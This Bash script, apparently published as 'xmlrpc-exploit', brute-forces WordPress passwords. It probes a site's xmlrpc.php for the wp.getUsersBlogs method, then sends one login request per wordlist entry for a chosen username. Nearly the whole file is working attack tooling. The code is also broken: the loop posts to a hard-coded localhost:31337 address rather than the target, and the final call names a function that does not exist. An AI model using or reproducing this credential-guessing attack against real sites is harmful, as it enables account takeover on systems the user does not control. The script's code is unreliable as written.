#!/bin/bash

target=$1
username=$2
wordlist=$3

declare -r purpleColour="\e[0;35m\033[1m"
declare -r endColour="\033[0m\e[0m"
declare -r grayColour="\e[0;37m\033[1m"
declare -r redColour="\e[0;31m\033[1m"
declare -r blueColour="\e[0;34m\033[1m"

function check_if_is_xmldir() {
	if $(echo $target | grep "xmlrpc.php"); then
		return 1
	fi
}
function ctrl_c() {
	echo -e "\n\n$redColour[-] Exiting the program $endColour"
	exit 1
}
trap ctrl_c SIGINT

function help_panel() {
	help_panel="""$purpleColour
##     ## ##     ## ##       ########  ########   ######  
 ##   ##  ###   ### ##       ##     ## ##     ## ##    ## 
  ## ##   #### #### ##       ##     ## ##     ## ##       
   ###    ## ### ## ##       ########  ########  ##       
  ## ##   ##     ## ##       ##   ##   ##        ##       
 ##   ##  ##     ## ##       ##    ##  ##        ##    ## 
##     ## ##     ## ######## ##     ## ##         ######   made by https://github.com/pillzDEV
$endColour
  """

	echo -e "$help_panel"
	echo -e "usage: xmlrpc-exploit [target] [username] [wordlist_path]\n"
}

function checkIfIsVulnerable() {
	xmlMethodsExploit="""
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
  """
	echo $xmlMethodsExploit >"xmlrpc.xml"
	method=$(curl -s -X POST "$target/xmlrpc.php" -d@xmlrpc.xml 2>/dev/null | grep -i "<value><string>wp.getUsersBlogs</string></value>")
	if [ ! "$method" ]; then
		echo -e "$redColour\n[-] This page not seems to be vulnerable$endColour"
		echo -e -n "${endColour}Do you want to continue -> y/n: "
		read ignoreAndContiue
		if ! [ "$ignoreAndContiue" == "y" ]; then
			echo -e "${purpleColour}\nSee you later!"
			exit 1
		fi
	fi
	echo -e "$grayColour\nStarting bruteforcing with ${target}/xmlrpc.php\n${endColour}"
	echo -e "${blueColour}URL:${endColour} $target"
	echo -e "${blueColour}USER:${endColour} $username "
	echo -e "${blueColour}WORDLIST:${endColour} $wordlist\n"

}
function bruteforceXMLRPC() {
	cat "$wordlist" | while read password; do
		xmlFile="""
<?xml version="1.0" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>${username}</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
    """
		echo $xmlFile >xmlrpc.xml
		response=$(curl -s -X POST http://localhost:31337/xmlrpc.php -d@xmlrpc.xml)

		if [ ! "$(echo $response | grep 'Incorrect username or password')" ] && [ "$response" ]; then
			echo -e "\n[+] The password for the user $username is: $password"
			exit 0
		else
			echo -e "${redColour}Failed with password: $password"
		fi
	done
	echo -e "\n\n${redColour}Password could not be found for the user${endColour} $username"
}
# _________________________________________________

if [ ! $1 ] || [ ! $2 ] || [ ! $3 ]; then
	exit 1
fi

if [ ! $(echo $1 | grep "http") ]; then
	echo -e "$redColour\nERROR!$endColour Invalid URL provided\n"
	exit 1
fi

if [ ! "$(ls -l "$wordlist" 2>/dev/null)" ]; then
	help_panel
	echo -e "$redColour\nERROR!$endColour invalid wordlist path"
	exit 1
fi

# _________________________________________________

help_panel
sleep 0.1
checkIfIsVulnerable
bruteforce
